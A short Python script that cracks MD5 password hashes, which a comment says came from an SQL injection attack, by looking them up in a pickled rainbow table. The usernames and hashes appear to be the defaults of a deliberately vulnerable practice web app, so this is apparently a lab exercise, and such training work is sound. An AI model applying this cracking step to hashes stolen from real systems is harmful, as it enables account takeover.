import pickle


# Target users and hashes passwords obtained from the SQL injection attack
target_users = {
    'admin': '5f4dcc3b5aa765d61d8327deb882cf99',
    'gordonb': 'e99a18c428cb38d5f260853678922e03',
    '1337': '8d3533d75ae2c3966d7e0d4fcc69216b',
    'pablo': '0d107d09f5bbe40cade3de5c71e9e9b7',
    'smithy': '5f4dcc3b5aa765d61d8327deb882cf99'
}

# Load the rainbow table dictionary from create_rainbow_table.py and the rockyou.txt passwords list
rainbow_file = open("rainbow_table.pkl", "rb")
rainbow_table = pickle.load(rainbow_file)

# Crack the passwords to obtain the plain text passwords against the rainbow table
cracked_users = {}
uncrack_users = []
for user, hash_password in target_users.items():
    if hash_password in rainbow_table:
        # Add user to cracked dictionary
        plain_text_password = rainbow_table[hash_password].decode('utf-8').strip()
        cracked_users[user] = plain_text_password
    else:
        # Add users to list of uncrack users - rainbow attack fails
        uncrack_users.append(user)

# Print the result
print(f'Cracked users:\n{cracked_users}\n')
print(f'Uncracked users: {uncrack_users}')